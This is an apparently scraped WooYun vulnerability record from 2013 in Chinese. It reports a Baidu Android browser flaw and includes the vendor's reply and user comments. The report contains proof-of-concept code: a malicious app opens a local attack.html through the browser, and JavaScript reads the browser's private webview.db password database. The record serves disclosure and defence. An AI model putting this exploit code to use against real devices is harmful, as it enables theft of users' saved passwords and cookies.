{"id": 7234, "wybug_id": "wooyun-2013-038158", "wybug_title": "百度手机浏览器缺陷可导致用户敏感数据泄漏(Android系统webkit内核问题t5内核浏览器无影响)", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2013-09-25 17:09", "wybug_open_date": "2013-12-24 17:10", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向公众公开  简要描述： 当一个攻击app(恶意或非恶意均可以) 向百度浏览器发送请求要求打开一个本地页面时，此本地页面中的可以按照攻击app的要求获取百度浏览器下的所有数据，包括cookie信息等，盗取过程无需root，盗取之后可以发送给远程服务器。 详细说明：  Android平台百度手机浏览器最新版恶意APP攻击代码：恶意APP可以先释放attack.html，然后打开SD卡中的恶意attack.html\n......\t public Intent getIntentForSE(String url) {         Intent intent = new Intent(\"android.intent.action.VIEW\");         intent.setClassName(\"com.baidu.browser.apps\", \"com.baidu.browser.framework.BdBrowserActivity\");         intent.setData(Uri.parse(url));         return intent;     }        \ttry {    \t\tString url = \"file:///mnt/sdcard/attack.html\";\t        Intent intent1 = getIntentForSE(url);\t        startActivity(intent1);\t\t    \t}    \tcatch(Exception e){}    \t}\nattack.html代码:获取取保存浏览器密码的db文件发送到远程服务器 \nvar request = false;\tif(window.XMLHttpRequest) {\trequest = new XMLHttpRequest();\tif(request.overrideMimeType) {\trequest.overrideMimeType('text/xml');\t}\t}\txmlhttp = request;\tvar prefix = \"file://data/data/com.baidu.browser.apps/databases\";\tvar postfix = \"/webview.db\"; \tvar path = prefix.concat(postfix);\txmlhttp.open(\"GET\", path, false);\txmlhttp.send(null);\tvar ret = xmlhttp.responseText;......\n   漏洞证明：  用测试代码测试。   修复方案：  可以参考其他已修复该漏洞的手机浏览器的修复方法，如chrome安卓版等。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-09-25 18:06 厂商回复： 感谢对百度安全的关注，我们马上处理此问题。--“百度，因你更安全” 最新状态： 2013-09-26：此问题在使用百度浏览器T5内核版是不存在的，目前绝大部分百度浏览器用户均使用T5内核版，故此漏洞仅影响一小部分用户。但是本着对用户安全负责的态度，我们仍然确认此漏洞，并积极推动修复。  ", "replys": "漏洞评价：\n评论\n     2013-09-25 17:11 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  一灯大师    \n     2013-09-25 17:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我也觉得是一灯大师忘记登陆了    \n     2013-09-26 00:27 |    \t\t一灯大师 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:28        | 一盏灯，也能让世界安全)\t\t \n  不应该吧，百度手机浏览器打开一个本地页面时，本地页面中是无法获取到百度浏览器下的私有信息吧。当然直接把读私有信息文件在网址处输入是可以打开的，但没啥用啊，无法上传啊。难道是测试手机有问题？    \n     2013-09-26 11:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @一灯大师 居然不是你？“本地页面中是无法获取到百度浏览器下的私有信息吧” 测试有问题？    \n     2013-09-26 16:14 |    \t\t一灯大师 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:28        | 一盏灯，也能让世界安全)\t\t \n  @xsser 肯定不是我，我完全路过的，T5内核没有问题的。一般都会初始化安装T5内核版本的。那人报这种蛋疼问题，肯定是自己去不初始化T5内核。不过百度明显还是很负责任的说，好厂家。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}